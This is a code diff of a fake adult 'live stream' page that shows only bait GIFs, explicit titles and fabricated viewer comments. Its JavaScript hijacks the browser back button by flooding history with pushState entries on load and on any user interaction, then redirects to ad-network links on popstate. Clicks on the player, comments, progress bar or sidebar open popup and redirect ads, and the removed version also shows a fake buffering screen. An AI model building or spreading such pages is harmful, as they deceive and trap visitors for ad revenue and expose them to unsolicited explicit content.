@@ -159,30 +159,20 @@
             text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
-        /* FAKE BUFFERING OVERLAY */
-        .fake-loader {
-            display: none;
+        /* PROGRESS BAR BAR STYLES */
+        .progress-bar-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
             position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.85);
-            z-index: 50;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
+            bottom: 0;
+            left: 0;
+            cursor: pointer;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.2);
-            border-top: 5px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 12px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .progress-bar-fill {
+            width: 35%;
+            height: 100%;
+            background: #ff0000;
         }
 
         /* VIDEO META */
@@ -224,6 +214,7 @@
             background: #121212;
             border-top: 1px solid #222;
             padding: 10px 12px;
+            cursor: pointer;
         }
         .chat-header {
             font-size: 12px;
@@ -238,8 +229,8 @@
             display: flex;
             flex-direction: column;
             gap: 8px;
-            max-height: 140px;
-            overflow: hidden;
+            max-height: 200px;
+            overflow-y: auto;
         }
         .comment-item {
             display: flex;
@@ -249,28 +240,20 @@
             background: #1a1a1a;
             padding: 6px 8px;
             border-radius: 4px;
-            animation: fadeIn 0.3s ease;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .c-avatar-icon {
-            width: 24px;
-            height: 24px;
+        .c-avatar {
+            width: 26px;
+            height: 26px;
             border-radius: 50%;
+            background: #cc0000;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 11px;
+            font-size: 10px;
+            font-weight: bold;
             color: #fff;
             flex-shrink: 0;
         }
-        .c-avatar-icon.hot { background: #e91e63; }
-        .c-avatar-icon.fire { background: #ff5722; }
-        .c-avatar-icon.vip { background: #ffc107; color: #000; }
-        .c-avatar-icon.cam { background: #9c27b0; }
-        
         .c-name {
             font-weight: 600;
             color: #bbb;
@@ -349,7 +332,6 @@
 </head>
 <body>
 
-    <!-- HEADER -->
     <div class="header">
         <div class="logo">
             <i class="fas fa-play-circle"></i> STREAMHUB <span>PRO</span>
@@ -359,19 +341,11 @@
         </div>
     </div>
 
-    <!-- MAIN CONTAINER -->
     <div class="container">
-        <!-- MAIN PLAYER AREA -->
         <div class="main-content">
-            <div class="player-wrapper action-trigger">
+            <div class="player-wrapper" id="videoPlayer">
                 <img id="mainGif" src="" alt="Stream Preview">
                 
-                <!-- FAKE BUFFERING OVERLAY -->
-                <div class="fake-loader" id="fakeLoader">
-                    <div class="spinner"></div>
-                    <div style="font-size:14px; font-weight:bold;">Connecting to HD Stream...</div>
-                </div>
-
                 <div class="overlay" id="playerOverlay">
                     <div class="top-info">
                         <span class="quality-badge"><i class="fas fa-check-circle"></i> 4K ULTRA HD</span>
@@ -385,6 +359,10 @@
                     </div>
                     <div></div>
                 </div>
+
+                <div class="progress-bar-container" id="progressSlider">
+                    <div class="progress-bar-fill"></div>
+                </div>
             </div>
 
             <div class="video-info">
@@ -392,109 +370,38 @@
                 <div class="video-stats">
                     <div>Started streaming 4 minutes ago</div>
                     <div class="action-btns">
-                        <div class="action-btn action-trigger"><i class="fas fa-thumbs-up"></i> 142K</div>
-                        <div class="action-btn action-trigger"><i class="fas fa-share"></i> Share</div>
+                        <div class="action-btn"><i class="fas fa-thumbs-up"></i> 142K</div>
+                        <div class="action-btn"><i class="fas fa-share"></i> Share</div>
                     </div>
                 </div>
             </div>
 
-            <!-- LIVE CHAT -->
-            <div class="live-chat-box">
+            <div class="live-chat-box" id="commentsBox">
                 <div class="chat-header">
                     <span>Top Live Comments</span>
                     <span style="color: #ff0000;"><i class="fas fa-circle" style="font-size: 8px;"></i> Live Chat</span>
                 </div>
-                <div class="chat-messages" id="chatStream">
-                    <!-- Dynamic Comments -->
-                </div>
+                <div class="chat-messages" id="commentsList">
+                    </div>
             </div>
         </div>
 
-        <!-- SIDEBAR -->
         <div class="sidebar">
             <div class="sidebar-title">Recommended Streams</div>
             <div id="suggestedList">
-                <!-- Dynamic Suggested Videos -->
-            </div>
+                </div>
         </div>
     </div>
 
-    <!-- JAVASCRIPT LOGIC -->
     <script>
         (function() {
             // ════════════════════════════════════════════════════════════
-            // LINK CONFIGURATION
+            // LINKS SETTINGS
             // ════════════════════════════════════════════════════════════
-            const FIRST_OFFER_LINK = 'https://honmia.com/4/ec5866dcb0471f77902fb47c83357279'; 
-            const BACK_AD_LINK     = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+            const DIRECT_LINK_MAIN = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+            const REDIRECT_LINK_1  = 'https://honmia.com/4/ec5866dcb0471f77902fb47c83357279';
+            const BACK_HIJACK_LINK = 'https://www.profitableratecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
 
-            let isLocked = false;
-
-            // ১. অফার লিংকে যাওয়ার আগে সেশন স্টোরেজে স্টেট সেভ করা
-            // এতে ইউজার ব্যাক করে আসলেও আমরা বুঝতে পারব সে অফার লিংক থেকে ফিরেছে
-            function checkRedirectOnPageShow() {
-                if (sessionStorage.getItem('offer_visited') === 'true') {
-                    // সেশন ক্লিয়ার করে সঙ্গে সঙ্গে ব্যাক হাইজ্যাক লিংকে পাঠাবে
-                    sessionStorage.removeItem('offer_visited');
-                    window.location.replace(BACK_AD_LINK);
-                }
-            }
-
-            // পেজ লোড বা ব্রাউজারের ব্যাক বাটন দিয়ে পেজে প্রবেশের সাথে সাথে চেক করবে
-            window.addEventListener('pageshow', checkRedirectOnPageShow);
-
-            // ২. স্ক্রল, টাচ বা যেকোনো ক্লিকের সাথে সাথে ব্যাক বাটন হাইজ্যাক প্রস্তুত করা
-            function lockBackHijack() {
-                if (!isLocked) {
-                    isLocked = true;
-                    for (let i = 0; i < 20; i++) {
-                        window.history.pushState({ hijack: true }, '', window.location.href);
-                    }
-                }
-            }
-
-            // Click সহ Touch, Scroll সব ইভেন্টেই হাইজ্যাক লক হবে
-            ['click', 'touchstart', 'touchmove', 'scroll', 'wheel'].forEach(eventType => {
-                window.addEventListener(eventType, lockBackHijack, { passive: true });
-            });
-
-            // ৩. সাধারণ ব্যাক বাটন প্রেস করলে ব্যাক বিজ্ঞাপন লিংকে যাবে
-            window.addEventListener('popstate', function(e) {
-                window.location.replace(BACK_AD_LINK);
-            });
-
-            // ৪. অ্যাকশন বাটনে ক্লিক করলে ফেক বাফারিং + অফার লিংকে রিডাইরেক্ট
-            function triggerActionWithBuffer(e) {
-                e.preventDefault();
-                e.stopPropagation();
-
-                // ক্লিকের সাথে সাথে হাইজ্যাক লক হবে
-                lockBackHijack();
-
-                // সেশন স্টোরেজে ফ্ল্যাগ সেট করা যেন ব্যাক করলে বোঝা যায়
-                sessionStorage.setItem('offer_visited', 'true');
-
-                // ফেক বাফারিং অ্যানিমেশন দেখানো
-                const loader = document.getElementById('fakeLoader');
-                if (loader) loader.style.display = 'flex';
-
-                // ১.৫ সেকেন্ড পর ১ম অফার লিংকে নিয়ে যাওয়া
-                setTimeout(() => {
-                    window.location.href = FIRST_OFFER_LINK;
-                }, 500);
-            }
-
-            // অ্যাকশন বাটনগুলোতে ইভেন্ট যুক্ত করা
-            function bindActionButtons() {
-                document.querySelectorAll('.action-trigger').forEach(el => {
-                    el.removeEventListener('click', triggerActionWithBuffer);
-                    el.addEventListener('click', triggerActionWithBuffer);
-                });
-            }
-
-            bindActionButtons();
-
-            // VIDEO DATA & DYNAMIC UI
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
                 { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
@@ -510,70 +417,116 @@
             ];
 
             const commentsPool = [
-                { icon: 'fa-kiss-wink-heart', class: 'hot', name: 'Naughty_Sam 💋', text: 'She is taking it so deep! Absolute perfection 🤤💯' },
-                { icon: 'fa-fire-alt', class: 'fire', name: 'HotGirl_69 🔥', text: 'OMG! 4K quality is crystal clear! 😱' },
-                { icon: 'fa-gem', class: 'vip', name: 'VIP_Member ⭐', text: 'Full video link unlocked guys! Amazing stream 🔥' },
-                { icon: 'fa-video', class: 'cam', name: 'LiveCam_Girl 🍓', text: 'Her body is insane! Love this 4K stream 🍒🍆' },
-                { icon: 'fa-heart', class: 'hot', name: 'Lisa_Adult 💋', text: 'Oh my god, best live scene ever! 🔥' },
-                { icon: 'fa-bolt', class: 'vip', name: 'Mike_Rod 💦', text: 'That creampie at the end was completely wild! 💦💦' }
+                { avatar: 'JD', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥', time: '2 mins ago' },
+                { avatar: 'NS', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯', time: '1 min ago' },
+                { avatar: 'K9', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!', time: '4 mins ago' },
+                { avatar: 'A2', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆', time: '3 mins ago' },
+                { avatar: 'LX', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥', time: '5 mins ago' },
+                { avatar: 'MR', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦', time: '30s ago' },
+                { avatar: 'BH', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...', time: '6 mins ago' },
+                { avatar: 'ST', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌', time: '7 mins ago' },
+                { avatar: 'P6', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!', time: '8 mins ago' },
+                { avatar: 'V2', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!', time: '10 mins ago' },
+                { avatar: 'X3', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅', time: '11 mins ago' },
+                { avatar: 'DK', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!', time: '12 mins ago' }
             ];
 
             const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
             document.getElementById('mainGif').src = mainVideo.src;
             document.getElementById('mainTitle').textContent = mainVideo.title;
 
-            let baseViews = 64280;
-            const viewsEl = document.getElementById('mainViews');
-            setInterval(() => {
-                baseViews += Math.floor(Math.random() * 25) - 10;
-                viewsEl.textContent = baseViews.toLocaleString();
-            }, 2500);
-
-            const chatStream = document.getElementById('chatStream');
-            let commentIndex = 0;
-
-            function addLiveChatMessage() {
-                const comment = commentsPool[commentIndex % commentsPool.length];
-                commentIndex++;
-
-                const chatItem = document.createElement('div');
-                chatItem.className = 'comment-item';
-                chatItem.innerHTML = `
-                    <div class="c-avatar-icon ${comment.class}"><i class="fas ${comment.icon}"></i></div>
-                    <div>
-                        <div class="c-name">${comment.name} <span>Just now</span></div>
-                        <div class="c-text">${comment.text}</div>
+            // Load Comments
+            let commentsHtml = '';
+            commentsPool.forEach(c => {
+                commentsHtml += `
+                <div class="comment-item">
+                    <div class="c-avatar">${c.avatar}</div>
+                    <div class="c-body">
+                        <div class="c-name">${c.name} <span>${c.time}</span></div>
+                        <div class="c-text">${c.text}</div>
                     </div>
-                `;
+                </div>`;
+            });
+            document.getElementById('commentsList').innerHTML = commentsHtml;
 
-                chatStream.appendChild(chatItem);
-                if (chatStream.children.length > 4) chatStream.removeChild(chatStream.children[0]);
-            }
-
-            addLiveChatMessage();
-            addLiveChatMessage();
-            setInterval(addLiveChatMessage, 2000);
-
+            // Load Sidebar Recommendations
             let sidebarHtml = '';
             videoPool.forEach((item) => {
-                if (item.title !== mainVideo.title) {
+                if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
                     sidebarHtml += `
-                    <div class="sidebar-item action-trigger">
+                    <div class="sidebar-item suggested-video-item">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
                         </div>
                         <div class="info">
                             <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} views • 4K HD</div>
+                            <div class="meta">${item.views} views • Recommendation</div>
                         </div>
                     </div>`;
                 }
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // ডায়নামিক কন্টেন্ট লোড হওয়ার পর বাটন পুনরায় বাইন্ড
-            bindActionButtons();
+            // ════════════════════════════════════════════════════════════
+            // CLICK LOGIC
+            // ════════════════════════════════════════════════════════════
+            function triggerLinks() {
+                try {
+                    window.open(REDIRECT_LINK_1, '_blank');
+                } catch (e) { }
+                window.open(DIRECT_LINK_MAIN, '_self');
+            }
+
+            document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
+            document.getElementById('commentsBox').addEventListener('click', triggerLinks);
+
+            document.getElementById('progressSlider').addEventListener('click', function(e) {
+                e.stopPropagation(); 
+                triggerLinks();
+            });
+
+            document.getElementById('suggestedList').addEventListener('click', function(e) {
+                if(e.target.closest('.suggested-video-item')) {
+                    triggerLinks();
+                }
+            });
+
+            // ════════════════════════════════════════════════════════════
+            // ENHANCED ADVANCED BACK-BUTTON & USER-ACTION HIJACKING
+            // ════════════════════════════════════════════════════════════
+            let hijackInitialized = false;
+
+            function pushStateHistory() {
+                for (let i = 0; i < 15; i++) {
+                    window.history.pushState({ page: i }, document.title, window.location.href);
+                }
+            }
+
+            function setupHijack() {
+                if (!hijackInitialized) {
+                    pushStateHistory();
+                    hijackInitialized = true;
+                }
+            }
+
+            // প্রথম লোডেই হিস্ট্রি স্প্যাম করার চেষ্টা করা
+            pushStateHistory();
+
+            // ব্যবহারকারীর যেকোন ইন্টারঅ্যাকশনে (ক্লিক, টাচ, স্ক্রোল, মাউস মুভ) হিস্ট্রি লক নিশ্চিত করা
+            const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
+            userEvents.forEach(evt => {
+                window.addEventListener(evt, setupHijack, { passive: true });
+            });
+
+            // পপ-স্টেট / ব্যাক বাটন প্রেস করার পর রিডাইরেক্ট করানো
+            window.addEventListener('popstate', function (event) {
+                pushStateHistory();
+                setTimeout(function() {
+                    window.location.href = BACK_HIJACK_LINK;
+                }, 10);
+            });
+
         })();
     </script>
 </body>
